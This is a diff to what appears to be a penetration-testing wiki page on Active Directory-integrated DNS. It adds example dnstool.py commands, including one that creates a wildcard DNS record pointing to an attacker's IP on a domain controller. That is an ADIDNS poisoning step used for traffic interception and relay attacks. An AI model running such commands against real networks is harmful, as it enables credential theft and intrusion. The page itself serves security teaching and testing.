@@ -24,7 +24,11 @@ ADIDNS zones can be remotely edited
 An awesome Python alternative to Powermad's functions is [dnstool](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py). Theoretically, this script can be used to `add`, `modify`, `query`, `remove`, `resurrect` and `ldapdelete` records in ADIDNS.
 
 ```bash
+# query a node
 dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController
+
+# add a node and attach a record
+dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
 ```
 {% endtab %}
 
